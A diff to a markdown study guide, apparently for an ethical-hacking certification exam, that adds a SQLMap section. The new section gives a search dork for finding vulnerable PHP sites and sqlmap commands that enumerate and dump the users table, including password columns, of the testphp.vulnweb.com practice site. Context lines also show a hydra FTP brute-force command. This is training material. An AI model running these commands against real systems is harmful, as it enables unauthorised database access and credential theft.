@@ -1,4 +1,4 @@
-# Example Questions
+# 🧪 Labs and Training
 
 * What is the IP of the Windows X machine?
 * Find the IP address of the machine which is running the RDP?
@@ -38,7 +38,8 @@
 * Use hydra to crack password
 * some question on Gui RATs tools
 * 4 5 problems on cryptography and steganography. Prepare all the Windows Gui tools from cryptography section. practice system exploitation using metasploit,
-*
+
+
 
 **Others exam questions:**
 
@@ -107,6 +108,34 @@ hydra -L /user.txt -P (password.txt ftp://172.0.16.21&#x20;
 If you get any questions related to netbios, SMB use metasploit.
 
 16\) BCTextEncoder
+
+
+
+### **SQLMap**
+
+site:[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) php?= (for finding vulnerable site)
+
+(for cookies- console->document.cookie)
+
+&#x20;
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  --dbs   (databases)
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart –tables   (tables)
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users --columns   (columns)
+
+(dump whole table)
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users  --dump  &#x20;
+
+&#x20;                                                           OR                                                                                   &#x20;
+
+(dump individual  column data)
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C uname  --dump &#x20;
+
+sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C pass  --dump
 
 ### Tools
 
@@ -207,11 +236,15 @@ We bypass auth, then use IDOR to find Maria's number
 
 
 
-BCTextEcndoer
+BCTextEncoder
 
 
 
+## Others <a href="#effd" id="effd"></a>
 
+<details>
+
+<summary>Others</summary>
 
 ### Tips <a href="#91e1" id="91e1"></a>
 
@@ -240,3 +273,7 @@ Your exam computers won't have regular internet access. You need to use your web
 
 * Start with the scanning part (NMAP Scan), since the scanning part takes some time, I moved on to other hacking questions.
 * Scan all ports on IPs because default scripts might not catch smart configurations.
+
+</details>
+
+### &#x20;<a href="#91e1" id="91e1"></a>
